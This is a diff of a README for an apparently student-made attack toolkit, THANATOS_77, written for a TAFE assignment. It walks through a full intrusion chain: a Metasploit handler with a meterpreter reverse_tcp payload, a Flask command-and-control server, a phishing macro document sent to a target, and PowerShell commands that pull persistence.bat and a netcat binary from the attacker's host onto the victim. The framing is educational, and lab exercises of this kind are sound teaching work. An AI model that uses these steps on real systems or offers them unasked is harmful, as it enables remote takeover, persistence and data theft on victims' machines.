@@ -28,17 +28,59 @@ All steps are sub 15 minutes total.
 config here: should be handled by scripts 
 
 # MANIFEST FOR TAFE ASSIGNMENT 
+Below is the specific steps for; dependencies, requirements, and commands for the IRTx scenario. 
+Utilising the aformentioned tools and tools within this git hub repository. 
 
--Run msfstarter.py
+## Beware: 
+Networking variables and http / folder locations in following programs are set to defaults and may need configurations pertaining to your current attack.
+1. FLASK_25.py
+2. msfstarted.py
+3. generate_macro_doc.sh
+4. Programs within /uploads
+5. Powershell scripts /\
 
--Run an appropriate flask program (Suggested is FLASK_25.py
+-Clone repo 
+```
+git clone https://github/SATUNIX/THANATOS_77
+```
+-Change permissions
+```
+sudo chmod +x * 
+```
+-Run msfstarter.py as sudo 
+``` 
+sudo python3 msfstarter.py
+```
+This will start a metasploit console listner in your current terminal. 
+![image](https://github.com/SATUNIX/THANATOS_77/assets/111553838/31a52ab2-4be3-4b30-85c4-1a3b4fbfaaf0)
+
+
+You may recieve the following errors: 
+
+![image](https://github.com/SATUNIX/THANATOS_77/assets/111553838/c576a96d-8b98-4135-b144-12c37a9b9cf7)
+If so: Please run the commands manually, your payload file should be created at this stage.
+    Replace variables with your respective configurations. 
+```
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST {my_ip}
+set LPORT {my_port}
+exploit -j -z
+```
+
+-Run an appropriate flask program (Suggested is FLASK_25.py with variables adjusted to your configuration) 
+![image](https://github.com/SATUNIX/THANATOS_77/assets/111553838/110a919c-3fd7-4df3-bd06-a61c2c05ff12)
+
+-Below is the web page for your C2 (Command and control server)
+-Here you are able to manually download and upload files to your kali / attacking machine. If the pfsense router is setup correctly, you should be able to recieve traffic. 
+![image](https://github.com/SATUNIX/THANATOS_77/assets/111553838/172562ea-a163-49de-8f16-76415200846f)
 
 -Target downloads document from generator from phishing
 
--All of the scripts require testing and configuration to verify the flask structure for get requests etc 
+-All of the scripts require your own testing and configuration to verify the flask structure for get requests, netcat listeners, etc 
 
--In msf console commands: 
-
+-Verify command as you are requesting powershell scripts within <yourIP/uploads/> 
+-In msf console command: 
 ```
 powershell -c "Invoke-WebRequest -Uri 'http://10.1.1.1:8080/persistence.bat' -OutFile 'persistence.bat'"
 powershell -c "Invoke-WebRequest -Uri 'http://10.1.1.1:8080/nc.bin' -OutFile 'nc.exe'"
